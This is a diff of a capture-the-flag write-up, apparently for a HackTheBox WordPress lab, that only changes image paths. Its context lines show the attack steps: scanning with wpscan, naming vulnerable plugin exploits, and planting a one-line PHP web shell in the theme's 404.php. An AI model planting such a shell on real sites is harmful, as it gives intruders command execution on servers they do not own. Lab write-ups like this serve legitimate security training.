@@ -18,18 +18,18 @@ Note: You need to have a knowledge about how in Linux DNS mapping is done when t
 # Questions
 ---
 
-![](../images/Pasted%20image%2020250220140318.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250220140318.png)
 ### Initial Enumeration
 ---
 
 Let's begin by checking the website:
 
 
-![](../images/Pasted%20image%2020250220140634.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250220140634.png)
 
 We got `Home`, `About Us`, `Services`, `Dropdown`, `Contact` and `Blog`, all seems normal, this main site is not running on WordPress so we cannot enumerate it yet, if we go to blog, we can see this:
 
-![](../images/Pasted%20image%2020250220140811.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250220140811.png)
 
 So, we need to add `blog.inlanefreight.local` to `/etc/hosts`, let's do it:
 
@@ -39,11 +39,11 @@ echo 'IP blog.inlanefreight.local' | sudo tee -a /etc/hosts
 
 If we check this site now, we can see this:
 
-![](../images/Pasted%20image%2020250220140954.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250220140954.png)
 
 We can check the technologies the site is using with `wappalyzer`:
 
-![](../images/Pasted%20image%2020250220141020.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250220141020.png)
 
 There we go, it is using WordPress `5.1.6`, let's use `wpscan` for the initial enumeration:
 
@@ -300,11 +300,11 @@ Now, if we go to:
 
 We can see the following:
 
-![](../images/Pasted%20image%2020250220142528.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250220142528.png)
 
 We found the first flag:
 
-![](../images/Pasted%20image%2020250220142544.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250220142544.png)
 
 First flag is:
 
@@ -365,7 +365,7 @@ We have 3 plugins:
 
 We can begin by checking each one of them using the versions to check if there's any vulnerability regarding the version:
 
-![](../images/Pasted%20image%2020250220142950.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250220142950.png)
 
 Found the one we need, it is a `email-subscribers 4.2.2 Unauthenticated File Download` Exploit, here's the PoC:
 
@@ -418,7 +418,7 @@ site-editor 1.1.1 exploit
 
 We get this:
 
-![](../images/Pasted%20image%2020250220143320.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250220143320.png)
 
 Which means, we got our vulnerable plugin and its version:
 
@@ -562,11 +562,11 @@ Got our credentials:
 
 Now, let's log in:
 
-![](../images/Pasted%20image%2020250220144626.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250220144626.png)
 
 Now we're in the admin panel, let's change the theme to a web shell:
 
-![](../images/Pasted%20image%2020250220144824.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250220144824.png)
 
 Let's change the contents of `404.php` to:
 
@@ -577,7 +577,7 @@ system($_GET['cmd']);
 ```
 
 
-![](../images/Pasted%20image%2020250220144836.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250220144836.png)
 
 Nice, now we need to use curl to check if the webshell works:
 
@@ -616,5 +616,5 @@ HTB{w0rdPr355_4SS3ssm3n7}
 ```
 
 
-![](../images/Pasted%20image%2020250220145253.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250220145253.png)
 
